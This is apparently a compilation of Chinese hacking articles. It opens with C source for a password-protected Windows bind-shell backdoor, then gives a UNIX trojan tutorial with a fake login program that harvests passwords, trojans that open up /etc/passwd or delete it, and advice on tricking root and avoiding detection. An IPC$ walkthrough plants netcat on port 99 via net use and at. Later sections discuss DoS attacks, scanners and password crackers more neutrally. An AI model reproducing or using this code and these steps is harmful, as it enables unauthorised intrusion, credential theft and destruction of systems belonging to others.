　　} 
　　else 
　　printf("\r\n Get Other Packets!"); 
　　return; 
} 
// bind shell函数 
DWORD CALLBACK bindshell(LPVOID) 
{ 
　　int bport = BIND_PORT; 
　　SOCKET bindServer, getClient; 
　　struct sockaddr_in addrServer, addrClient; 
　　char Buff[4096]; 
　　char *messages = "\r\n======================== Ping BackDoor V0.1 ========================\r\n========= Code by Lion. Welcome to Http://www.cnhonker.net =========\r\n"; 
　　char *getpass = "\r\n Your PassWord:"; 
　　char *passok = "\r\n OK! Please Enter:"; 
　　char *nothispass = "\r\n Sorry, Your PassWord Not Right.\r\n"; 
　　char *exitok = "\r\n Exit OK!\r\n"; 
　　int ret; 
　　// 创建一个socket 
　　bindServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
　　// 服务器地址和端口指定 
　　addrServer.sin_family = AF_INET; 
　　addrServer.sin_port = htons(bport); 
　　addrServer.sin_addr.s_addr = ADDR_ANY; 
　　// 设置超时 
　　int TimeOut = 60000; 
　　setsockopt(bindServer, SOL_SOCKET, SO_RCVTIMEO, (char*)&TimeOut, sizeof(TimeOut)); 
　　// 设置重复利用端口 
　　UINT bReUser = 1; 
　　setsockopt(bindServer, SOL_SOCKET, SO_REUSEADDR, (char*)&bReUser, sizeof(bReUser)); 
　　// 监听端口 
　　bind(bindServer, (struct sockaddr*)&addrServer, sizeof(addrServer)); 
　　listen(bindServer, 2); 
　　printf("\r\n Bind Port on %d ok.", bport); 
　　// 接受client连接 
　　int iLen = sizeof(addrClient); 
　　// 接收1次连接 
　　getClient = accept(bindServer, (struct sockaddr*)&addrClient, &iLen); 
　　if(getClient != INVALID_SOCKET) 
　　{ 
　　　　// 如果有连接进来设置延时为60S 
　　　　int iTimeOut = 60000; 
　　　　setsockopt(getClient, SOL_SOCKET, SO_RCVTIMEO, (char*)&iTimeOut, sizeof(iTimeOut)); 
　　} 
　　else 
　　　　return -1; 
　　// 写欢迎信息 
　　send(getClient, messages, strlen(messages), 0); 
　　// 写密码验证信息 
　　send(getClient, getpass, strlen(getpass), 0); 
　　// 接收数据 
　　recv(getClient,Buff,1024,0); 
　　// 验证密码 
　　if(!(strstr(Buff, DEF_PASSWORD))) 
　　{ 
　　　　// 如果密码错误,写密码错误信息 
　　　　send(getClient, nothispass, strlen(nothispass), 0); 
　　　　printf("\r\n PassWord Not Right!"); 
　　　　closesocket(getClient); 
　　　　closesocket(bindServer); 
　　　　return -1; 
　　} 
　　// 写通过验证信息 
　　send(getClient, passok, strlen(passok), 0); 
　　// 建两个匿名管道 
　　HANDLE hReadPipe1,hWritePipe1,hReadPipe2,hWritePipe2; 
　　unsigned long lBytesRead; 
　　　　　　 
　　SECURITY_ATTRIBUTES sa; 
　　sa.nLength=12; 
　　sa.lpSecurityDescriptor=0; 
　　sa.bInheritHandle=TRUE; 
　　CreatePipe(&hReadPipe1,&hWritePipe1,&sa,0); 
　　CreatePipe(&hReadPipe2,&hWritePipe2,&sa,0); 
　　　　 
　　STARTUPINFO siinfo; 
　　char cmdLine[] = "cmd.exe"; 
　　PROCESS_INformATION ProcessInformation; 
　　ZeroMemory(&siinfo,sizeof(siinfo)); 
　　siinfo.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES; 
　　siinfo.wShowWindow = SW_HIDE; 
　　siinfo.hStdInput = hReadPipe2;　　　　　　　　　　　　// 读取写入pipe2的数据 
　　siinfo.hStdOutput = siinfo.hStdError = hWritePipe1;　　// 向这里写数据 
　　printf("\r\n Pipe Create OK!"); 
　　// 创建一个cmd进程, 由hReadPipe2读数据,向hWritePipe1写数据 
　　int bread = CreateProcess(NULL,cmdLine,NULL,NULL,1,0,NULL,NULL,&siinfo,&ProcessInformation); 
　　while(1) 
　　{ 
　　　　// 检查管道是否有数据返回 
　　　　ret=PeekNamedPipe(hReadPipe1,Buff,1024,&lBytesRead,0,0); 
　　　　if(lBytesRead) 
　　　　{ 
　　　　　　// 从管道hReadPipe1读数据 
　　　　　　ret = ReadFile(hReadPipe1,Buff,lBytesRead,&lBytesRead,0); 
　　　　　　if(!ret) break; 
　　　　　　 
　　　　　　// 把从管道hReadPipe1读到的数据写入连接 getClient 
　　　　　　ret = send(getClient,Buff,lBytesRead,0); 
　　　　　　if(ret <= 0) break; 
　　　　} 
　　　　else 
　　　　{ 
　　　　　　// 如果连接 getClient 有接收到数据 
　　　　　　lBytesRead = recv(getClient,Buff,1024,0); 
　　　　　　if(lBytesRead <= 0) break; 
　　　　 
　　　　　　// 把从连接 getClient 读到的数据写入hWritePipe2 
　　　　　　ret = WriteFile(hWritePipe2,Buff,lBytesRead,&lBytesRead,0); 
　　　　　　if(lBytesRead > 4 && Buff[0]==‘e‘ && Buff[1]==‘x‘ && Buff[2]==‘i‘ && Buff[3]==‘t‘) 
　　　　　　{ 
　　　　　　　　// 写退出信息 
　　　　　　　　send(getClient, exitok, strlen(exitok), 0); 
　　　　　　　　closesocket(getClient); 
　　　　　　　　closesocket(bindServer); 
　　　　　　　　return 1; 
　　　　　　} 
　　　　　　if(!ret) break; 
　　　　} 
　　} 
　　closesocket(getClient); 
　　closesocket(bindServer); 
　　return 1; 
} 
　 
破坏TCP/IP
一个利用TCP/IP协议软件弱点进行进攻的经典的例子是Ping of Death攻击.利用的具体方法是,你的对手创建一个超过了IP标准的最大长度--65535个字节的IP数据包.当这个"浮肿的"数据包到达的时候,它就使得一个使用脆弱的TCP/IP协议软件和操作系统的服务器瘫痪. 
所有现代的操作系统和协议软件对Ping of Death攻击都有免疫力,但是老的Unix系统可能仍然是脆弱的. 
另一个利用粗制滥造的TCP/IP软件进行攻击的例子是Teardrop,它利用了系统重组IP数据包过程中的漏洞.一个数据包在从互联网的另一端到你这里的路上也许会被分拆成更小的数据报文.这些数据报中的每一个都拥有最初的IP数据报的报头,同时还拥有一个偏移字节来标示它拥有原始数据报中的哪些字节.通过这些信息,一个被正常分割的数据报文能够在它的目的地被重新组装起来,并且网络也能够正常运转而不被中断.当一次Teardrop攻击开始时,你的服务器将受到拥有重叠的偏移字段的IP数据包的轰炸.如果你的服务器或是路由器不能丢弃这些数据包而且如果企图重组它们,你的服务器就会很快瘫痪.如果你的系统被及时更新了,或者你拥有一个可以阻挡Teardrop数据包的防火墙,你应该不会有什么麻烦. 
利用TCP/IP协议本身的漏洞来进行攻击的手段也很多.这些手段中最流行的就是SYN攻击.SYN工作的原理就是利用两个互联网程序间协议握手的过程进行的攻击.协议握手的过程如下,其中一个应用程序向另一个程序发送一个TCP SYN(同步)数据包.然后目标程序向第一个程序发送一个TCP-ACK应答数据包作为回答;第一个程序最后用一个ACK应答数据包确认已经收到.一旦这两个程序握手成功,它们就准备一起运行了. 
SYN攻击用一堆TCP SYN数据包来淹没它的受害者.每个SYN数据包迫使目标服务器产生一个SYN-ACK应答数据包然后等待对应的ACK应答.这很快就导致过量的SYN-ACK一个接一个的堆积在缓存队列里.当缓存队列满了以后,系统就会停止应答到来的SYN请求. 
如果SYN攻击中包括了拥有错误IP源地址的SYN数据包,情况很快就会变得更糟.在这种情况下,当SYN-ACK被送出的时候,ACK应答就永远不会被收到.飞快充满的缓存队列使得合法程序的SYN请求无法再通过. 
更加厉害的是,与之相似的Land攻击手段使用欺骗性的SYN数据包,它带有一个伪装的IP地址,使得它看起来像是来自你自己的网络.现在,SYN攻击就像是来自于你防火墙的内部,这使得问题更加严重. 
大多数时新的操作系统和防火墙可以阻止SYN攻击.另一个简单的阻止SYN攻击的方法是阻塞掉所有带有已知的错误的IP源地址的数据包.这些数据包应该包括带有错误的为内部保留的IP地址的外部数据包,它的范围是从10.0.0.0到10.255.255.255,127.0.0.0到127.255.255.255,从172.16.0.0到172.31.255.255以及从192.168.0.0到192.168.255.255 

UNIX下的特洛伊木马
“UNIX安全”是种矛盾的说法。UNIX系统是很容易就可以用暴力法攻破，因为大多数UNIX系统并没有设置登录次数限制，而且还有诸如root、bin、sys、uucp等缺省用户。一旦进入了系统，就很容易获得系统控制权。如果懂得C语言，你甚至可以使系统为你工作，完全除去系统的安全屏障，建立自已的帐号，读取别人的文件，等等。这些事情都可以通过本文中简单的C语言代码来实现。
需求： 
首先，你需要有一个有效的UNIX系统帐号。如果该UNIX系统是运行在如PDP/11、VAX、Pyramid等机器上的相对简单的UNIX系统（如4.2bsd或AT&T System V等），则则会获得很好的效果。如果你在学校拥有一个基于这些系统的帐号，那就再好不过了。
注释： 
本文的起因是1986年4月刊登的一篇题目为“UNIX安全”的文章。在这篇文章中，作者说到：“我们希望，我们所提供的资料在一定程度上引起人们的兴趣和避免UNIX过于容易成为“骇客们的食谱”。因此我们有意省略了某些细节。”于是我根据这篇文章的大纲，按照其中谈到的方法，编写出以下清晰完整的例子。
实例一：骗取密码 
只要有一点UNIX和C知识，你会发现做到这一点根本不难。但是，你首先必须有权访问一台许多人都可以使用的计算机，如学校中的公用计算机。
当登录到一个UNIX系统时，会出现类似以下内容的屏幕：
Tiburon Systems 4.2bsd / System V (shark) login: shark 
Password: （无回显）
以下程序模拟了一个登录过程。你在终端上运行该程序后就离开。那些无知的“笨蛋”会上来输入他们的帐号和密码，这些都会保存在一个文件里。然后屏幕显示“login incorrect”（登录错误），并要求这个“笨蛋”再次登录。这一次才是真正的登录程序，当然会成功登录了（真是一群“笨蛋”）。
把以下程序代码输入名为“horse.c”的文件中。注意，你需要针对不同系统的显示更改程序的前8行。
----- Code Begins Here -----
/* this is what a 'C' comment looks like. You can leave them out. */
/* #define's are like macros you can use for configuration. */
#define SYSTEM "\n\nTiburon Systems 4.2bsd UNIX (shark)\n\n"
/* The above string should be made to look like the message that your
* system prints when ready. Each \n represents a carriage return.
*/ 
#define LOGIN "login: " 
/* The above is the login prompt. You shouldn't have to change it 
* unless you're running some strange version of UNIX. 
*/ 
#define PASSWORD "password:" 
/* The above is the password prompt. You shouldn't have to change 
* it, either. 
*/ 
#define WAIT 2 
/* The numerical value assigned to WAIT is the delay you get after 
* "password:" and before "login incorrect." Change it (0 = almost 
* no delay, 5 = LONG delay) so it looks like your system's delay. 
* realism is the key here - we don't want our target to become 
* suspicious. 
*/ 
#define INCORRECT "Login incorrect.\n" 
/* Change the above so it is what your system says when an incorrect 
* login is given. You shouldn't have to change it. 
*/ 
#define FILENAME "stuff" 
/* FILENAME is the name of the file that the hacked passwords will 
* be put into automatically. 'stuff' is a perfectly good name. 
*/ 
/* Don't change the rest of the program unless there is a need to 
* and you know 'C'. 
*/ 
#include <curses.h> 
#include <signal.h> 
int stop(); 
main() 
{ 
char name[10], password[10]; 
int i; 
FILE *fp, *fopen(); 
signal(SIGINT,stop); 
initscr(); 
printf(SYSTEM); 
printf(LOGIN); 
scanf("%[^\n]",name); 
getchar(); 
noecho(); 
printf(PASSWORD); 
scanf("%[^\n]",password); 
printf("\n"); 
getchar(); 
echo(); 
sleep(WAIT); 
if ( ( fp = fopen(FILENAME,"a") ) != NULL ) { 
#fprintf(fp,"login %s has password %s\n",name,password); 
#fclose(fp); 
#} 
printf(INCORRECT); 
endwin(); 
} 
stop() 
{ 
endwin(); 
exit(0); 
} 
----- Source Ends Here ----- 

OK，正如我所说的，输入以上代码，并修改它，使它看起来与真正的登录过程完全一致。编译horse.c文件。（ % 不必输入，它只是系统提示符。） 
% cc horse.c -lcurses -ltermcap 
% mv a.out horse 
现在你已有了可执行文件horse。运行它，如果所显示的内容与真正的登录过程不一样，便重新编辑horse.c源程序，并重新编译。在使用木马程序前，建立名为trap（或者其他名字）的文件，内容如下：
horse (运行木马程序)
login (运行系统登录程序)
执行trap文件：
% source trap (重复：不要输入 %)
然后离开终端...
程序运行几次后，检查stuff文件（或者你定义的任何文件），其内容应类似如下：
user john has password secret
user mary has password smegma
etc.
记录下这些帐号和密码，然后删除这个文件。（否则，如果超级用户看到这个文件，你可就危险了。）
注：为了取得更好的效果，终端最好设置为在一定时间内无用户登录便退出。这样，即使无人使用该终端，木马程序也不会空运行漫长的14小时（或更长）了。
下一个实例运行在一个远程系统上，如你已成功侵入的诸如Michigan的VAX、Dratmouth的UNIX等系统。然而，它要求UNIX初学者具有一定的C语言知识。
实例二：读取他人文件
当用户运行一个程序的时候，他们就是被创建进程的拥有者，程序便可以做出任何不超越其权限的事情，如删除文件，创建文件，并赋予他人访问的权限等。
当用户在UNIX系统上保存邮件时，邮件被保存在用户根目录下的mbox文件中。在缺省情况下，该文件仅能由用户读取。下面的小程序可以解锁运行此程序的用户mbox文件（如使用chmod 777命令，即允许系统中的任意用户拥有完全访问权限）：
----- Code Begins Here -----
#include <pwd.h>
struct passwd *getpwnam(name);
struct passwd *p;
char buf[255];
main()
{
p = getpwnam(getlogin()); 
sprintf(buf,"%s/%s",p->pw_dir,"mbox"); 
if ( access(buf,0) > -1 ) { 
sprintf(buf,"chmod 777 %s/%s",p->pw_dir,"mbox"); 
system(buf); 
} 
} 
----- Code Ends Here ----- 
现在，问题是：怎样才能让攻击目标运行这个程序呢？ 
如果系统有发布消息的功能（如4.xbsd中的msgs命令），你可以将程序发布出去。到UNIX WORLD等杂志上找一个工具或游戏程序，并将以上代码插入到程序里。例如，你有一个tic-tac-toe程序，并已将木马代码放入tic-tac-toe程序真正运行的代码之前，你便可以发布“我有一个新的tic-tac-toe程序，你们可以测试它，可在我的目录下找到它。”之类的消息。你也可以单独向你的欺骗目标发出类似的邮件。 
如果你找不到一个程序可以插入木马，也可以在以上代码最后两个}间插入以下代码： 

printf("Error opening tic-tac-toe data file. Sorry!\n"); 
当此程序运行，它将显示以上错误信息。用户就会想：“嗯，这小子连这么简单的 
tic-tac-toe程序都不会写！”但其实可笑的是他——你现在已经可以读取他的邮件了。 
如果你想读取某个用户目录下的特定文件（例如“secret”），只要向这个用户投寄以下程序： 
main() 
{ 
if ( access("secret",0) > -1 ) system("chmod 777 secret"); 
} 
然后与他“交谈”或通信，象Joe Loser所说的：“我刚写了一个super_star-wars程序，你愿意测试一下吗？” 
无论你希望何人运行某一命令，都不是一件难事，只要把他放进C程序中的system()函数，然后诱骗他运行这个程序！ 
下面是利用以上技术的一些用法： 
实例三：成为超级用户 
写一个让别人运行的程序，插入下面代码： 
if ( !strcmp(getlogin(),"root") ) system("whatever you want"); 
该代码检查root用户是否在运行本程序。如是，你便可以利用他的权限执行你所希望的命令了（只要将whatever you want改为该命令即可）。以下是常用的命令： 
"chmod 666 /etc/passwd" 
/etc/passwd是系统密码文件，只有root用户可以读写，在一般情况下，其他用户只能读（密码是经加密的）。如你不清楚其结构格式，可以查看它。上面的命令使你也可以读写该文件——如为自己和朋友建立无权限限制的帐号。 
"chmod 666 /etc/group" 
通过把自己加入某些具有高级权限的组，你便可以为所欲为了。 
"chmod 666 /usr/lib/uucp/L.sys" 
检查这个文件确定这个系统是否在UUCP（UNIX-UNIX CONNECTION PROTOCOL）网络上。此文件包含了访问网络中其他系统的拨号用户和密码，以一般情况下，只有UUCP管理员能读取它。找到UUCP管理员帐号并诱使其在不知情的情况下运行以上代码，你便可以读取它了。 
"rm /etc/passwd" 
如果你诱使root用户运行这行代码，就会删除系统密码文件，此系统将停机，并且不能再次运行了。这是具有相当破坏力的。 
当你准备向系统放置特洛伊木马，有几条规则应该注意。 
如果隐蔽性是主要的，（如侵入用户邮箱或删除他的所有文件等，）那么这个程序不应该被过多地执行（如一个流行的电脑游戏）——一旦用户发现他们的文件被允许完全访问，那么他是比较容易找到原因的。为了加强木马的隐蔽性，程序应该表明为“测试”程序（比如你正在编写的游戏），并且请求个别人运行它，并与他们“交流”意见（只是为了欺骗他们）。正如我所说的，“测试”程序在完成其任务后，可以显示虚假的错误消息。你便可以对他们说：“唉呀，我想我要继续修改它。”在他们离开后，你便可以读取已被你解锁的文件了。 
如果木马程序的主要目的是捕捉运行此程序的特定用户——如root或其他高级用户，你就应该把木马程序代码放入可被系统中绝大多数用户频繁执行的程序里。因为木马程序在特定用户运行前是隐匿的。 
如果你发现C语言代码很难理解，你就必须从PASCAL语言等转变过来并学会C语言。这种情况不会有损C语言作为一种伟大的编程语言。 
以上我们已经看到在UNIX系统上怎样做了。一旦你捕捉到了root用户（如你可以修/etc/passwd 
文件），就要从特洛伊木马程序中删除有关欺骗的代码，这样你就永远不会被捉住了。

详解IPC$入侵方法
一、什么是IPC$漏洞
IPC$是共享“命名管道”的资源，它对于程序间的通讯很重要。在远程管理计算机和查看计算机的共享资源时使用。利用IPC$我们可以与目标主机建立一个空的连接（无需用户名与密码），而利用这个空的连接，我们就可以得到目标主机上的用户列表。用“流光”的IPC$探测功能，就可以得到用户列表了，并可以配合字典，进行密码尝试。
二、骇客是如何利用IPC$漏洞
　我们要使用到的工具有：
1.流光4.6（http://www.netxeyes.com）有提供下载！流光禁止扫描国内的主机，请不要打免IP的补丁，否
则你就会觉得流光更本没有用处，榕哥这样做的原因也是希望骇客不要破坏国内主机！
其实并不需要我们使用很多工具，因为流光一个就可以帮我们搞定了！
2.SRV这个工具也在流光的目录中，很多防火墙将他列为病毒，其实这是一个很好的工具。全名是NetCat，这里改名为Srv.exe。用于在主机建立一个端口为99的shell。然后我们就可以TELNET IP 99上去了。
3.Ntlm.exe：是榕哥写的一个程序，用于修改Windows 2000 Telnet Servery身份验证的方式。
测试IP：127.0.0.1
熟悉了使用工具的话，下面我们来看看骇客是怎么入侵的。
第一步：运行流光4.6（如下图所示）
按CTRL+R键弹出扫描框，我们这里只是做个测试，目的是告诉大家这个漏洞的危害，所以我们现在随便选择一段IP进行扫描。我们扫描的是127.0.0.1
其他的我们使用默认，不需要改变设置
第二步：大家打开WIN2000自带的命令提示行，注意：这里我们不是教大家怎么破坏，只是给大家介绍这个漏洞的危害，所以下面的IP是假设的,并不存在。
C:\>net use \\127.0.0.1\IPC$ "" /user:"admintitrators" //这是我用流光扫到的密码~~~我们就拿它开 
刀吧~ 上面的意思是与127.0.0.1建立一个连接，因为我们使用流光已经扫到用户名是administrators，密码
为[空]，所以第一个双引号那里不用输入什么，后面一个双引号里的是用户名，我们输入administrators//
命令成功完成。
　首先大家先把需要用到的工具COPY的你自己的C盘下，就是在流光TOOLS中。
C:\>copy srv.exe \\127.0.0.1\admin$ //先复制srv.exe上去，在流光的Tools目录就有。（这里的ADMIN$是指ADMIN用户的c:\winnt\system32\ 大家还可以使用c$,d$这个的意思是C盘与D盘，这看你要复制到什么地方去了） 
已复制 1 个文件。（成功了！*.*)
C:\>net time \\127.0.0.1 //查查时间。(这里的时间是指对方计算机的，也就是我们要入侵的127.0.0.1的时间，还有要提醒大家要注意的一点是，请把时间转换为24小时制，因为不少朋友问过我为什么启动不了服务，其实就是因为时间的问题）//
\\127.0.0.1 的当前时间是 2002/3/19 上午 11:00
命令成功完成。
C:\>at \\127.0.0.1 11:05 srv.exe //用at命令启动srv.exe吧~！（这里设置的时间要比主机时间快，不然你怎么启动啊，呵呵！）//
新加了一项作业，其作业 ID = 1
C:\>net time \\127.0.0.1 //再查查够时间没有？！哈！ 时间到，LET'S GO FOLLOW ME !//
\\127.0.0.1 的当前时间是 2002/3/19 上午 11:05
命令成功完成。
C:\>telnet 127.0.0.1 99 //我们telnet吧，注意端口是99哦,TELNET默认的是23端口，但是我们使用的是SRV在对方计算机中为我们建立一个99端口的SHELL。//
//哈哈！进来了耶！ 再给他加上一个ntlm
C:\>copy ntlm.exe \\127.0.0.1\admin$ //我们再开一个DOS窗口，把ntlm.exe上传到主机上。（也是在流光流光的Tools目录）
已复制 1 个文件。
C:\WINNT\system32>ntlm //我们输入ntlm启动吧。（这里的C:\WINNT\system32>指的是对方计算机，我们运行ntlm其实是让这个程序在对方计算机上运行）//
ntlm
Windows 2000 Telnet Dump, by Assassin, All Rights Reserved.
Done! //OK了
C:\WINNT\system32>
C:\WINNT\system32>net start telnet //然后直接用net start telnet启动telnet
Telnet 服务器正在启动.
Telnet 服务器已经启动成功。¥\¡C //哈哈，我们成功了，该上去了。
第三步：我们使用TELNET到对方计算机上去
TELNET 127.0.0.1
接着输入用户名与密码就进入了 
(我们已经进来了，使用方法和DOS命令是一样的）
这就是中国黑客入侵美国计算机的方法，在这之前是不是让你觉得很神秘呢？其实很简单的。不要认为这就是黑客的方法，这只能说是骇客。最后希望大家不要那这种方法来实践国内主机，否则我就成罪人了。
三、如何防范IPC$漏洞
　看来上面的方法是不是觉得该检测一下自己是否有这个漏洞，还不赶快把这个漏洞给补上？跟我来吧，下面我们将教你如何防范IPC$的入侵
解决方法：
1、禁止建立空连接
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA]
RestrictAnonymous = DWORD:00000001
2、禁止管理共享
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]
AutoShareServer = DWORD:00000000
　3.到http://www.heibai.net/download/show.php?id=2194下载 delshare.zip
4.如果您觉得麻烦的话这样也可以，net share ipc$ /delete 把这个放进你的启动栏里面去
　5.如果上面的方法您不会的话，这个方法可以说是最简单的了。把您的密码设置复杂一下，一面被一些不怀好意的人使用工具给破出来。不过想提醒大家一点，在复杂的密码都有可能被破解
评价几款黑客常用的攻击工具
随着企业网络复杂性的增加，它也更容易受到攻击。各种各样的操作系统都有其特定的配置， 每个都在高度连接环境中高速运行着无数的设备和应用，结果由于意想不到的漏洞、小故障和后门等，使得网管员直到闯入者使用未经授权的网络资源时，才意识到破坏的存在。 
一种连根铲除网络中的弱点的方式是扫描。大批基于软件的扫描工具可探测网络中的操作系统、应用、口令等易受攻击的部位。事实上，在攻击之前，欲闯入者使用这些工具来打开网络，因而扫描也是一种提前发现网络装甲上的裂缝的安全预防措施。 
根据现有的技术知识水平，必须决定是自己扫描还是租用扫描服务。如果自己扫描，可以选择商业工具、开放资源或免费软件工具。 
有很多开放资源和免费软件工具，如Nmap是黑客编写的。为什么合法的网络管理员有时也会使用黑客工具？因为使用此类工具不仅对测试网络的安全环境非常有效率，而且对了解闯入者到底是怎样闯入网络的很有益处。但是，商业软件包具有同样的功能，而且有便于使用的界面和报告功能。 
Ping命令和端口数 
漏洞扫描是从黑客的眼光来审视网络的。表面上两台机器之间的通信暴露出了潜在的漏洞信息，扫描工具把这些网络信息与开发数据库进行匹配，以决定哪个可以在网络中表述。 
漏洞扫描由三个基本步骤构成。第一步是网络发现，使用Ping命令发现活跃的网络设备。Ping命令把因特网控制信息协议(ICMP)分组发送到目标系统，寻找响应，这建立了闯入者能作为攻击目标个体的活跃主机的基本地图。 
第二步是端口扫描，辨认出那些在侦听方式的端口以及可利用的活跃服务的端口。端口扫描也能辨认出目标上的操作系统，包括安装的是哪个服务包或者内核发布。要注意，仅发现侦听端口并不意味着漏洞。有时，闯入者必须探究更多的包操作以获取有潜在破坏性的信息。 
在最后一步中，扫描器分析数据并产生报告，详细描述潜在的漏洞和补救办法。因为报告数据至关重要，需要选择一种清晰并有效地显示结果的解决方案。在购买或使用任何扫描器之前，应花些时间仔细审查报告样品。 
口令攻击者 
口令审计软件是另一种对闯入者和管理人员都有用的评估工具。管理人员使用这样的工具审计用户口令，保证其遵守正确的口令策略。许多开放资源口令攻击者可以在因特网得到，很多商业安全扫描器也包括口令审计。 
第一个Windows NT口令攻击工具是L0phtCrack，由L0pht Heavy Industries集团开发。WindowsNT通过把纯文本转换为无意义的字节串的加密方式隐藏口令，即哈希表方法。问题是NT必须也能支持旧的哈希表算法，以和LAN管理器兼容。因为L0phtCrack已经反向设计了LAN管理器口令加密功能，它生产同样的哈希结果。因此，L0phtCrack仅仅匹配哈希表，而不解密口令。 
产品通过三种方式利用这一缺点。首先，字典攻击收集常作为口令的词，并在其上运行哈希算法；其次，它比较这个清单和NT哈希表，寻找匹配。如果找不出匹配，程序下一步给字典清单中的词添加随机字符；最后，如果仍不成功，它运行一次强力攻击，尝试每一个字母和符号的可能组合直到发现一个匹配。 
上述情况听起来就好像任何运行L0phtCrack的熟手都能解开你的口令，但潜在的攻击者仍必须克服几个障碍：首先，攻击者必须得到储存NT哈希表的安全账号管理器(SAM)文件，这要求在目标机上有管理员权限；其次，由于SAM文件和哈希表匹配需要时间，因而L0phtCrack也必须脱机运行。用L0phtCrack攻击口令的更复杂的方式可以功过查看更多信息资源了解。 
扫描和扫描器 
在购买或下载最新和最好的网络扫描器之前，应花一些时间寻找符合目标的工具。 
很重要的一点是产品的易使用性。如果你喜欢图形用户界面而不是命令行界面，你可能会倾向于商业产品。但是，没人能阻止你既使用商业软件又使用免费软件工具。 
当选择产品时，要确保它按优先顺序列出漏洞。全面展开扫描可以产生一份几百页的报告。如果你知道哪个问题是必须马上处理的，列出这样的清单更便于管理。 
应该知道扫描会影响网络的性能，达到什么程度取决于扫描的深度和设备的数目。确定扫描时间，使其最不可能影响重要的业务，同时，寻找允许你定位特定系统的工具。你可能希望能更经常地扫描网络特定的部分，事实上，用消耗资源的分组检测来检测你的设备是没有什么意义的。 
发现漏洞数据库更新的频度。像病毒一样，新漏洞总是不断出现，所以工具应该是能跟上最新攻击方式的。换句话说，有不同的列表和不同的计算漏洞的方式，这样不会被很大的数目搞得眼花缭乱。产品A可能显示发现1万处漏洞，而产品B则检测出5千处，这并不意味产品A更好。 
可能人们也关心供应商是从什么地方得到漏洞信息的。当每一个销售商利用如CERT、BugTraq和SANS研究所等组织的公共邮件时，很多供应商也有机构内部研究队伍，在广泛发布之前，已使你认识到安全漏洞的存在。 
清扫 
假设你已从头到尾彻底检查了你的网络，已发现了漏洞、阅读了报告并应用了补丁程序。现在的网络是百分之百安全了，至少直到聪明的编码器发现一种全新的让分组通过你的防火墙的方式。 
漏洞扫描不是一次性的补救，因为黑客能不断发现新漏洞。此外，软件供应商正不断发布他们产品的新版本，即使刚刚买到的新软件都可能有未预知的漏洞，或者以意想不到的方式和你的网络相互影响。 
扫描的频率应取决于安全状况，以及网络设备的生命期。如果体系结构相对稳定，很少更动或升级，可以少一些扫描。但是，特别敏感的网络部分，则应保证经常检查。 
总之，应准备在以后的扫描和清扫中投入大量的时间。简单地忽视他们对于发现漏洞没有任何帮助。 
扫描和表述 
在正常的TCP通信序列中，客户机器和服务器必须检查三步握手以建立联系。客户机通过把SYN分组发送给服务器启动握手。如果服务器是可用的，它用一个SYN/ACK分组应答通信。最后，客户发送自己的ACK分组并建立联系。 
闯入者能操纵上述握手序列，以收集基于服务器反应的重要信息，包括错误配置的操作系统和有已知漏洞的软件版本。 
下列的端 口扫描通常被用来对付目标主机。清单已由出版者同意发布，摘自《揭露黑客》，第二版(Osborne/McGrawHill，2001)，由Joel Scambray、Stuart McClure和George Kurtz著。TCP连接扫描。这种扫描和目标端口与完整的三步握手(SYN，SYN/ACK和ACK)相联系。很容易被目标系统检测到。 
TCP SYN扫描。该技术被称为半开放扫描，因为未建立完整的TCP连接，而是给目标端口发送SYN分组。如果SYN/ACK被目标端口收到，我们能推断出它是在侦听状态中。如果RST/ACK被收到，它通常表示端口没在侦听。执行端口扫描的系统将发送RST/ACK，这不会建立完整的连接。这种技术有比完全的TCP连接更隐蔽的优势，它可能不会被目标机登录。 
TCP FIN扫描。该技术把FIN分组发送给目标端口。基于RFC 793，目标系统应该向所有关闭端口回送RST。这技术通常仅对基于Unix的TCP/IP协议栈产生影响。 
TCP Xmas Tree扫描。该技术是把FIN，URG和PUSH分组发送给目标端口。基于RFC 793，目标系统应该向所有关闭端口回送RST。 
TCP Null扫描。该技术关闭所有的标识，基于RFC 793，目标系统应该向所有关闭端口回送RST。 
TCP ACK扫描。该技术设计出防火墙规则集，能帮助识别防火墙是一个仅允许建立的联系(有ACK位设置的连接)。通过简单分组过滤还是执行高级包过滤的严密防火墙。 
TCP Windows扫描。该技术可以检测某些系统的开放及过滤/无过滤端口(例如AIX和FreeBSD)。它是根据未按常规报告TCP窗口大小判断。 
TCP RPC扫描。这是Unix系统所特有的技术，能检测和识别远程过程调用(RPC)端口和相应的程序及版本号。 
资源 
《揭露黑客》第二版的作者是Joel Scambray、Stuart McClure和George Kurtz，其中有几章在漏洞扫描、安全漏洞和口令攻击方面有深入描述。 
可以从开发者网站www.insecure.org下载扫描工具Nmap。该站点也有安全漏洞清单和与其他扫描工具和安全站点的连接。 
信息安全杂志2000年7月到2000年10月发表了有关漏洞评估的四部分的系列文章。 
Web站点Windows IT Security讨论了如何在Windows 2000系统下使用L0phtCrack。 
拒绝服务攻击原理及解决方法
　    Internet给全世界的人们带来了无限的生机，真正实现了无国界的全球村。但是还有很多困绕我们的因素，象IP地址的短缺，大量带宽的损耗，以及政府规章的限制和编程技术的不足。现在，由于多年来网络系统累积下了无数的漏洞，我们将面临着更大的威胁，网络中潜伏的好事者将会以此作为缺口来对系统进行攻击，我们也不得不为以前的疏忽付出更大的努力。虽然大多的网络系统产品都标榜着安全的旗号，但就我们现在的网络协议和残缺的技术来看，危险无处不在。 
拒绝服务攻击是一种遍布全球的系统漏洞，黑客们正醉心于对它的研究，而无数的网络用户将成为这种攻击的受害者。Tribe Flood Network, tfn2k, smurf, targa…还有许多的程序都在被不断的开发出来。这些程序想瘟疫一样在网络中散布开来，使得我们的村落更为薄弱，我们不得不找出一套简单易用的安全解决方案来应付黑暗中的攻击。 
在这篇文章中我们将会提供： 
? 对当今网络中的拒绝服务攻击的讨论。 
? 安全环境中的一些非技术性因素以及我们必须克服的一些障碍问题。 
? 如何认清产品推销商所提供的一些谎言。 
在我们正式步入对这些问题的技术性讨论之前，让我们先从现实的生活中的实际角度来看一下这些困绕我们的问题。 
当前的技术概况 
在我们进入更为详细的解决方案之前，让我们首先对问题做一下更深入的了解。 
与安全相关的这些小问题如果详细来讲的话都能成为一个大的章节，但限于篇幅的原因，我们只能先作一下大体的了解。 
